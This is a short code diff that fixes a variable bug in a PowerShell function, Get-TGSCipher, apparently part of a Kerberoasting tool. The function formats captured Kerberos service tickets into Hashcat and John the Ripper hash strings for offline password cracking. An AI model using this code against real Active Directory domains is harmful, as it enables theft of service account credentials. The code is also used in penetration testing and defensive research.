@@ -128,7 +128,7 @@ function Get-TGSCipher
                 foreach ($Target in $TargetList) {
                     if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
                         $Account = $Target.Target -split "@"
-                        $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Object.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)
+                        $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Target.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)
                     }
                     else {
                         Write-Warning "$SPN couldn't be cracked with Hashcat. Currently Hashcat supports RC4-HMAC only)"
@@ -141,7 +141,7 @@ function Get-TGSCipher
                 foreach ($Target in $TargetList) {
                     if ($Target.EncryptionType -eq "RC4-HMAC (23)") {
                         $Account = $Target.Target -split "@"
-                        $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Object.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)  
+                        $Output += "`$krb5tgs`$23`$*$($Account[0])`$$($Account[1])`$$($Target.SPN)*`$" + $Target.EncTicketPart.Substring(0,32) + "`$" + $Target.EncTicketPart.Substring(32)  
                     }
                     else {
                         Write-Warning "$SPN couldn't be cracked with John. Currently John supports RC4-HMAC only)"
